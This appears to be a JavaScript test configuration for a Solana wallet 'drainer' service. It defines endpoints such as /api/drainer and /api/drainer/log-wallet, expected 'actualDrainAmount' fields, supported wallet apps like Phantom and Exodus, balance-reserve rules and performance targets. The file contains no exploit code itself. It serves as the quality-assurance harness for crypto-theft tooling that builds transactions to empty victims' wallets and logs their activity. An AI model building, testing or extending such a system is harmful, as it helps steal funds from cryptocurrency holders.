// Test Configuration for Comprehensive System Validation
export const testConfig = {
  // Test Environment
  environment: {
    baseUrl: 'http://localhost:3000',
    timeout: 30000,
    retries: 3
  },

  // Test Data
  testData: {
    validWallets: [
      'FLeDqdHg1TzG5x3Sjd1Q6sdUAqUzpEZuw1VnXHPm88Nj', // Test wallet
      '11111111111111111111111111111111', // System program (should fail)
      'InvalidWalletAddress123' // Invalid format (should fail)
    ],
    walletTypes: ['Phantom', 'Solflare', 'Backpack', 'Glow', 'Trust Wallet', 'Exodus'],
    testBalances: [1000000, 5000000, 10000000, 50000000] // 0.001, 0.005, 0.01, 0.05 SOL
  },

  // Expected Response Patterns
  expectedResponses: {
    health: {
      status: 'healthy',
      requiredFields: ['status', 'timestamp']
    },
    drainer: {
      success: {
        requiredFields: ['success', 'transaction', 'actualDrainAmount'],
        successValue: true,
        transactionType: 'string', // base64
        actualDrainAmountType: 'number'
      },
      error: {
        requiredFields: ['error', 'details', 'code'],
        errorTypes: ['INSUFFICIENT_FUNDS', 'RATE_LIMITED', 'INVALID_WALLET_ADDRESS']
      }
    },
    enhancements: {
      status: {
        requiredFields: ['timestamp', 'configuration', 'modules'],
        configurationFields: ['core', 'enhanced']
      },
      health: {
        requiredFields: ['timestamp', 'status', 'configuration', 'modules'],
        statusValues: ['healthy', 'degraded', 'basic']
      }
    }
  },

  // Test Scenarios
  testScenarios: {
    // API Endpoint Tests
    apiEndpoints: [
      { path: '/health', method: 'GET', expectedStatus: 200 },
      { path: '/api/enhancements/status', method: 'GET', expectedStatus: 200 },
      { path: '/api/enhancements/health', method: 'GET', expectedStatus: 200 },
      { path: '/api/drainer', method: 'POST', expectedStatus: [200, 400, 429, 500] },
      { path: '/api/drainer/log-wallet', method: 'POST', expectedStatus: [200, 500] },
      { path: '/api/drainer/log-confirmation', method: 'POST', expectedStatus: [200, 500] },
      { path: '/api/drainer/log-cancellation', method: 'POST', expectedStatus: [200, 500] }
    ],

    // Transaction Creation Tests
    transactionTests: [
      {
        name: 'Valid Wallet - Sufficient Balance',
        wallet: 'FLeDqdHg1TzG5x3Sjd1Q6sdUAqUzpEZuw1VnXHPm88Nj',
        walletType: 'Phantom',
        expectedResult: 'success',
        expectedFields: ['transaction', 'actualDrainAmount'],
        validateTransaction: true
      },
      {
        name: 'Invalid Wallet - System Program',
        wallet: '11111111111111111111111111111111',
        walletType: 'Unknown',
        expectedResult: 'error',
        expectedCode: 'INVALID_WALLET_ADDRESS'
      },
      {
        name: 'Invalid Wallet - Malformed Address',
        wallet: 'InvalidWalletAddress123',
        walletType: 'Unknown',
        expectedResult: 'error',
        expectedCode: 'INVALID_PUBLIC_KEY'
      }
    ],

    // Rate Limiting Tests
    rateLimitTests: [
      {
        name: 'Single Request - Should Succeed',
        requests: 1,
        expectedResult: 'success'
      },
      {
        name: 'Multiple Requests - Should Rate Limit',
        requests: 20, // Exceeds rate limit
        expectedResult: 'rate_limited',
        expectedCode: 'RATE_LIMIT_EXCEEDED'
      }
    ],

    // Error Handling Tests
    errorHandlingTests: [
      {
        name: 'Missing User Parameter',
        body: {},
        expectedResult: 'error',
        expectedCode: 'MISSING_PARAMETER'
      },
      {
        name: 'Empty User Parameter',
        body: { user: '' },
        expectedResult: 'error',
        expectedCode: 'MISSING_PARAMETER'
      }
    ]
  },

  // Validation Rules
  validationRules: {
    // Transaction Validation
    transaction: {
      minSize: 100, // Minimum transaction size in bytes
      maxSize: 10000, // Maximum transaction size in bytes
      requiredFields: ['feePayer', 'recentBlockhash', 'instructions'],
      instructionCount: { min: 1, max: 10 }
    },

    // Balance Validation
    balance: {
      minLamports: 100000, // 0.0001 SOL minimum
      maxLamports: 1000000000000, // 1000 SOL maximum (reasonable upper bound)
      reservePercentage: { min: 0.05, max: 0.15 } // 5-15% should be reserved
    },

    // Response Validation
    response: {
      maxResponseTime: 10000, // 10 seconds maximum
      requiredHeaders: ['Access-Control-Allow-Origin', 'Content-Type'],
      maxResponseSize: 1000000 // 1MB maximum response size
    }
  },

  // Performance Benchmarks
  performance: {
    responseTime: {
      health: 1000, // 1 second
      status: 2000, // 2 seconds
      drainer: 5000, // 5 seconds
      logEndpoints: 1000 // 1 second
    },
    throughput: {
      requestsPerSecond: 5, // More realistic for our system
      concurrentUsers: 3
    }
  }
};

export default testConfig;
